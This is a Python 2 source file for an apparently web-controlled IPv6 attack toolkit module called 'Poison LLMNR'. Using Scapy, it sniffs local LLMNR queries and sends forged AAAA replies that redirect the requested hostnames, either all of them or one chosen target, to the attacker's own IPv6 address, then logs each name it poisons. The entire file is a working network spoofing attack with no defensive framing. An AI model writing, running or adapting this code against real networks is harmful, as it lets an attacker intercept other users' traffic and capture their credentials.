from scapy.all import *
from copy import copy
import sys
from multiprocessing.pool import ThreadPool, Pool
from template import Template

sys.path.insert(0,'..')
from ipv6.ipv6 import createIPv6, get_source_address, grabRawDst, grabRawSrc, getMacAddress

class IPv6Module(Template):

  def __init__(self, socketio, namespace):
    super(IPv6Module, self).__init__(socketio, namespace)
    self.modname = "poisonLLMNR"
    self.menu_text = "Poison LLMNR"
    self.actions = [
      {
        "title": "Poison LLMNR",
        "action": "action",
        "target": True
      },
      {
        "title": "Poison LLMNR",
        "action": "action"
      },
      {
        "title": "Stop LLMNR poisoner",
        "action": "stop_sniffer"
      }
    ]

  def action(self, target=None):
    self.sniffer = IPv6Sniffer(self)
    self.socket_log('Sniffer intitialized.')
    self.sniffer.start()

  def stop_sniffer(self, msg):
    try:
      self.sniffer.stop()
      self.socket_log('Sniffer terminated.')
    except Exception, e:
      self.socket_log('Sniffer not yet intitialized.')

class IPv6Sniffer:
    pool = None
    stopped = False

    def __init__(self, mod):
        self.mod = mod

    # initialize the listener
    def start(self):
        print("sniffer intialized")
        self.stopped = False
        self.pool = ThreadPool(processes=1)
        self.pool.apply_async(self.listen)
        # self.listen()

    # start the listener
    def listen(self):
        res = sniff(lfilter=lambda (packet): IPv6 in packet,
                    prn=lambda (packet): self.callback(packet),
                    stop_filter=self.stopfilter,
                    store=0)
        return res

    # stop the listener
    def stop(self):
        print('Stopping sniffer')
        self.stopped = True
        self.pool.close()
        self.pool.join()

    def stopfilter(self, packet):
        return self.stopped

    # callback for when packets are received
    def callback(self, packet):
        res = {}
        res['ip'] = packet[IPv6].src
        channel = False
        if UDP in packet and packet[UDP].dport == 5355 and LLMNRQuery in packet:
            channel = 'llmnr_result'
            try:
                self.poisonLLMNR(packet)
            except Exception,e:
                exc_info = sys.exc_info()
                traceback.print_exception(*exc_info)
                #print e

    def poisonLLMNR(self, packet,target=None, src=None, dst=get_source_address(IPv6(dst="ff02::1"))):
        responseDict = {}
        responses = [packet]
        for response in responses:
            ip = response[IPv6].src
            rawSrc = copy(response[IPv6])
            rawSrc.remove_payload()
            rawSrc = grabRawSrc(rawSrc)
            mac = getMacAddress(rawSrc)
            if ip not in responseDict:
                responseDict[ip] = {"mac": mac}

            if response[LLMNRQuery].fields["opcode"] == 0L and response[LLMNRQuery].fields["ancount"] == 0 and response[LLMNRQuery].fields["qd"].fields["qtype"] == 28:
                ip_packet = createIPv6()
                ip_packet.fields["nh"] = 17 #DNS
                ip_packet.fields["hlim"] = 255
                ip_packet.fields["dst"] = response[IPv6].fields["src"]
                ip_packet.fields["src"] = dst

                udp_segment = UDP()
                udp_segment.fields["dport"] = response[UDP].fields["sport"]
                udp_segment.fields["sport"] = response[UDP].fields["dport"]

                llmnrQuery = LLMNRQuery()
                llmnrQuery.fields["qr"] = 1L
                llmnrQuery.fields["qdcount"] = 1
                llmnrQuery.fields["opcode"] = 0L
                llmnrQuery.fields["id"] = response[LLMNRQuery].fields["id"]
                llmnrQuery.fields["ancount"] = 1

                rr = DNSRR()
                rr.fields["rclass"] = 1
                rr.fields["ttl"] = 30
                rr.fields["rrname"] = response[LLMNRQuery].fields["qd"].fields["qname"]
                rr.fields["rdata"] = dst
                rr.fields["type"] = 28

                qr = DNSQR()
                qr.fields["qclass"] = 1
                qr.fields["qtype"] = 28
                qr.fields["qname"] = response[LLMNRQuery].fields["qd"].fields["qname"]

                llmnrQuery.fields["an"] = rr
                llmnrQuery.fields["qd"] = qr

                if target:
                    if target == response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""):
                        send(ip_packet/udp_segment/llmnrQuery)
                        out = "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
                        self.mod.socket_log(out)
                        print out
                else:
                    send(ip_packet/udp_segment/llmnrQuery)
                    out = "Poisioned LLMNR name: %s  Packet sent to %s" % (response[LLMNRQuery].fields["qd"].fields["qname"].replace(".",""),response[IPv6].fields["src"])
                    self.mod.socket_log(out)
                    print out
